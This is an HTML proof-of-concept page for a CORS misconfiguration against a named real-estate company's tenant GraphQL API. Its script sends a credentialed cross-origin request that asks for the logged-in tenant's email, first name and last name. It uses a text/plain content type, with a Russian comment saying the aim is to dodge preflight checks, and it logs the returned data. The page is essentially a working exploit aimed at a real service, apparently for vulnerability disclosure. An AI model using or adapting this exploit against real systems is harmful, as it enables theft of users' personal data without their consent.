<!DOCTYPE html>
<html>
<head>
    <title>CORS Misconfiguration PoC</title>
</head>
<body>
    <h2>Check Console for Data Exfiltration</h2>
    <script>
        const target = "https://tenant-experience-api.realestate.com.au/graphql";
        const query = {"query": "query { tenantProfile { accountDetails { email } personalDetails { firstName lastName } } }"};

        fetch(target, {
            method: "POST",
            mode: "cors",
            credentials: "include",
            headers: {
                "Content-Type": "text/plain", // Пытаемся минимизировать Preflight-проверки
                "x-locke-id": "cfb83558-c729-5763-96ed-e5d20f4cf107"
            },
            body: JSON.stringify(query)
        })
        .then(r => r.json())
        .then(data => console.log("Success:", data))
        .catch(err => console.log("Error:", err));
    </script>
</body>
</html>
